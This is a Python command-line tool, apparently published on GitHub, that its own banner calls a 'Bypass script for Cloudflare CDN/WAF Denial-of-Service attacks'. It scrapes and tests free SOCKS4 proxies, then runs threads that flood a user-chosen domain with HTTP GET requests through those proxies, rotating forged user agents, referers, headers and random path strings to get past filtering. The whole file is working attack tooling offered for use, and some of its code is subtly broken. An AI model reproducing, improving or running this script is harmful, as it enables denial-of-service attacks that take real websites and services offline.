import time
import sys
import os
import string
import random
import socket
import requests
import threading
from urllib.parse import urlparse

# From the REQUESTS module, socks dependency must be installed:
#
#       pip install requests[socks]
#       pip install PySocks
#

SOCKS4 = []

active = 0

flag = threading.Event()

# set colors
b = '\033[1m'  #bright
r = '\033[31m' #red
w = '\033[37m' #white
g = '\033[32m' #green
y = '\033[33m' #yellow

# user-agents
UA = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.{} Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 13.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.{} Safari/537.36',
    'Mozilla/5.0 (Linux; Android 12; Pixel 5 Build/SP1A.210812.016) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.{} Mobile Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.{}; Media Center PC 6.0)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/{}.36 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0 Chrome/103.0.5060.{} Safari/537.36',
    'Mozilla/5.0 (X11; CrOS x86_64 14592.79.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.{} Safari/537.36',
    'Mozilla/5.0 (Samsung SmartTV; U; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (LG Smart TV; WebOS; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Opera/92.0.{}.37 Safari/537.36',
    'Mozilla/5.0 (Nintendo Switch; U; en) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9b4) Gecko/2008030800 SUSE/2.9.94-4.2 Firefox/3.{}',
    'Mozilla/5.0 (Windows; U; Windows NT 6.1; ru-RU; rv:1.9.2.3) Gecko/20100401 Firefox/3.{}.3',
    'Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:0.9.2) Gecko/20020508 Netscape6/6.{}',
    'Mozilla/5.0 (compatible; Baiduspider/2.0.0.{}; +http://www.baidu.com/search/spider.html)',
    'Mozilla/5.0 (compatible; Applebot/1.{}.0.1; +http://www.apple.com/go/applebot)',
    'Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.0.4) Firefox/3.{}.8)',
    'Opera/9.64 (Windows NT 6.1; U; MRA 5.5 (build 02842); ru) Presto/2.{}.1',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:108.0) Gecko/20100101 Firefox/108.{}',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/{}.0.1462.54 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/16.0 Safari/537.{}',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Brave/1.44.105 Chrome/105.0.5195.{} Safari/537.36',
    'Mozilla/5.0 (Xbox One; U; Windows NT 10.0; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (PlayStation 5; CERO; version 1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (Linux; Android 9.0; Shield Android TV Build/PKQ1.180904.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/5.0 (Linux; Android 11; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.{} Mobile Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36 Googlebot/2.1',
    'Mozilla/5.0 (Roku/8.1; U; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{} Safari/537.36',
    'Mozilla/4.0 (Mozilla/4.{}; MSIE 7.0; Windows NT 5.1; FDM; SV1)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Linux i686; en) Opera 10.{}',
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.{})',
    'Mozilla/4.7 (compatible; OffByOne; Windows 2000; .NET CLR 1.1.{})',
    'Opera/7.23 (Windows 98; U) [en/{}]'
]

# url referers
RF = [
    'https://www.facebook.com/l.php?u={}',
    'https://www.facebook.com/sharer/sharer.php?u={}',
    'https://drive.google.com/viewerng/viewer?url={}',
    'https://developers.google.com/speed/pagespeed/insights/?url={}',
    'http://help.baidu.com/searchResult?keywords={}',
    'http://translate.google.com/translate?u={}',
    'https://play.google.com/store/search?q={}',
    'http://www.google.com/translate?u={}',
    'https://add.my.yahoo.com/rss?url={}',
    'http://www.google.com/?q={}',
    'http://www.bing.com/search?q={}',
    'http://validator.w3.org/check?uri={}',
    'http://www.google.com/ig/adde?moduleurl={}',
    'http://host-tracker.com/check_page/?furl={}',
    'http://www.onlinewebcheck.com/check.php?url={}'
]

# other random headers
RH = [
    'Accept-Ranges: none',
    'X-Frame-Options: DENY',
    'Pragma: no-cache',
    'Retry-After: 120',
    'Server: Apache/2.4.46 (Unix)',
    'Cache-Control: no-cache',
    'Accept: application/json, text/plain, */*',
    'X-Content-Type-Options: nosniff',
    'Accept-Encoding: gzip, deflate, br',
    'Accept-Language: en-US,en;q=0.9',
    'Content-Type: application/json',
    'Transfer-Encoding: chunked',
    'Origin: http://www.google.com',
    'Accept-Charset: utf-8, iso-8859-1;q=0.5',
    'X-XSS-Protection: 1; mode=block',
    'Accept-Encoding: deflate, gzip;q=1.0, *;q=0.5',
    'Accept: text/html, application/xhtml+xml, application/xml;q=0.9, image/webp, */*;q=0.8',
    'Content-Type: application/x-www-form-urlencoded',
    'Cache-Control: no-cache, no-store, must-revalidate',
    'X-Forwarded-For: 1.1.1.1',
    'X-Rate-Limit: 1000',
    'DNT: 1'
]

def attack(domain, ip, port, append, path, proxy_count):
    global UA, RF, RH, SOCKS4, flag
    
    # initial header
    default = f'GET / HTTP/1.1\r\nHost:{domain}\r\nConnection: keep-alive\r\n\r\n'
    
    while not flag.is_set():
        try:
            # grab random proxy
            new_proxy = random.choice(SOCKS4)
            
            # capture ip address and port
            proxy_ip, proxy_port = new_proxy.split(":")
            
            # build socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            
            # connect
            s.connect((proxy_ip, proxy_port))
            
            # send initial request
            s.send(default.encode())
            
            count = 0
            
            # send x-amount of requests through proxy before rotating
            while count <= int(proxy_count):
                
                count +=1
                
                # setup http path
                if append.lower().startswith('y'):
                    target_path = path + ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
                
                # pull random user-agent / inject dynamic browser version
                usr = random.choice(UA).format(str(random.randint(50, 150)))
                
                # generate url referer
                ref = random.choice(RF).format(domain)
                
                # select a random header
                alt = random.choice(RH)
                
                # build complete header
                header = f'GET {target_path} HTTP/1.1\r\nHost:{domain}\r\nUser-agent:{usr}\r\nReferer:{ref}\r\n{alt}\r\n\r\n'

                # send dynamic header
                s.send(header.encode())
                
                # exit nested loop if flag thrown
                if flag.is_set():
                    break
                    
            s.close() 
            
        except:
            pass

def resolve(target):
    global r, y

    target = target.lower()
    
    if not (target.startswith('http://') or target.startswith('https://')):
        target = 'http://' + target
        
    # attempt hostname resolution
    try:
        domain = urlparse(target).netloc
        ip = socket.gethostbyname(domain)
        return domain, ip
    except:
        sys.exit(f'{r}\r\nDNS resolution failed! Exiting...')

def checkproxy(proxy):
    global SOCKS4, active
    
    active +=1
    
    #proxy configuratio
    
    proxy = f'socks4://{proxy}'
    
    proxies = {
        'http': proxy,
        'https': proxy
    }
    
    #send test probe
    try:
        response = requests.head('http://example.com', proxies=proxies, timeout=3)
        
        if response.status_code == 200:
            SOCKS4.append(proxy)
            
    except ImportError as e: #ModuleNotFoundError
        sys.exit(f'\r\n{y}Exiting! Dependency requirement: {e}')
    except:
        pass
        # ConnectionRefusedError
        # socks.ProxyConnectionError
        # urllib3.exceptions.NewConnectionError
        # blah blah blah...
    
    active -=1

def scrape():
    global w, r, y, SOCKS4
    
    #proxy api
    api = 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&protocol=socks4&proxy_format=protocolipport&format=text&timeout=2500'
    
    #attempt scrape operation
    try:
        #call api
        response = requests.get(api)
        
        #if successful...
        if response.status_code == 200:
            #capture output
            html_content = response.content.decode().splitlines()
        
            for line in html_content:
                
                line = line.replace("socks4://", "")
                
                SOCKS4.append(line)
    except:
        pass
    
    # abort operation if scrape operation wasnt successful
    if not SOCKS4:
        sys.exit('\r\n{r}API unreachable! Exiting...\r\n')
    
    # verbose output to user
    i = 0
    for x in SOCKS4:
        i +=1
        print(f'\r{y}    ---> Scraped: {i}', end='', flush=True)
        time.sleep(0.1)   

def slwprnt(msg):
    for c in msg + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()

        time.sleep(8./90)

def main():
    # import colors
    global b, r, w, g, y
    
    # import alt
    global SOCKS4, active, flag

    # clear env
    if sys.platform == 'win32':
        os.system('cls')
    else:
        os.system('clear')

    # display banner
    print(f'''{b}
{w}              ____ _____  {r} ____                            
{w}             / ___|  ___| {r}| __ ) _   _ _ __   __ _ ___ ___
{w}            | |   | |_    {r}|  _ \\| | | | '_ \\ / _` / __/ __|
{w}            | |___|  _|   {r}| |_) | |_| | |_) | (_| \\__ \\__ \\
{w}             \____|_|     {r}|____/ \\__, | .__/ \\__,_|___/___/
{w}                          {r}       |___/|_|
''')

    # display sub-title
    slwprnt(f'{g}     Bypass script for Cloudflare CDN/WAF Denial-of-Service attacks{w}\r\n')

    # scrape proxies
    print(f'{w}[~] Gathering some proxies...')
    scrape()
    
    # check proxies
    print(f'\r\n\r\n{w}[~] Checking! Please stand-by...')
    try:
        # copy proxy/s to temporary list    
        CHECK_SOCKS4 = SOCKS4.copy()
        SOCKS4.clear()
        
        for proxy in CHECK_SOCKS4:
            # probe each proxy
            x = threading.Thread(target=checkproxy, args=(proxy,))
            x.daemon = True
            x.start()

            # thread-cap (max of five)
            while active >= 5:
                pass
            
            # versbose output
            length = str(len(SOCKS4))
            
            print(f'\r{y}    ---> Responsive: {length}', end='', flush=True)
            
        #ensure at least one alive proxy
        if not SOCKS4:
            sys.exit(f'{r}\r\n\r\nOops! All proxy/s are either unreachable or have too high latency. Exiting...\r\n')
        
    except KeyboardInterrupt:
        sys.exit('\r\nAborted!\r\n')
    except Exception as e:
        sys.exit(f'Error: {r}{e}')
    
    # capture user inputs
    while True:
        try:
            target = input(f'\r\n\r\n{w}Target domain/URL:{g} ')
            
            # dns resolution
            domain, ip = resolve(target)
        
            target_port = int(input(f'{w}Port (default 80):{g} '))
    
            target_path = input(f'{w}HTTP path (default "/"):{g} ')
            
            # format path
            if not target_path:
                target_path = '/'
                
            if not target_path.startswith('/'):
                target_path = '/' + target_path
    
            append = input(f'{w}Add junk-strings to path? Y/n:{g} ')
                
            proxy_count = int(input(f'{w}Requests per proxy (default 5):{g} '))
            
            thread_count = int(input(f'{w}Thread count (default 5):{g} '))
            
            attak_time = int(input(f'{w}Duration (seconds):{g} '))
    
            input(f'\r\n{w}Ready? Strike <ENTER> to launch and <CTRL+C> to abort...\r\n')
    
            break
        except KeyboardInterrupt:
            sys.exit(f'\r\n{w}Aborted!\r\n')
        except:
            pass
            
    # manage attack
    try:
        # store threads for later access
        tasks = []
        
        # execute attack thread/s
        for _ in range(0, int(thread_count)):
            t = threading.Thread(target=attack, args=(domain, ip, target_port, append, target_path, proxy_count))
            t.daemon = True
            tasks.append(t)
            t.start()
    
        # calculate end of duration
        stop_attack = time.time() + attak_time
        
        # pause while attack is taking place...
        while time.time() <= stop_attack:
            pass
            
    except KeyboardInterrupt:
        pass
    except Exception as e:
        sys.exit(f'Error: {r}{e}')
    
    # clean-up
    print(f'\r\n{w}[~] Please wait! Powering down...')
        
    # enable abort
    flag.set()
    
    # kill active thread/s
    try:
        for t in tasks:
            try:
                t.join()
            except:
                pass
    except KeyboardInterrupt:
        # impatient user...
        pass
    
    # exit message
    slwprnt(f'{w}Attack complete!{g} More free junk at{r} https://github.com/waived')
    
    sys.exit()

if __name__ == '__main__':
    main()
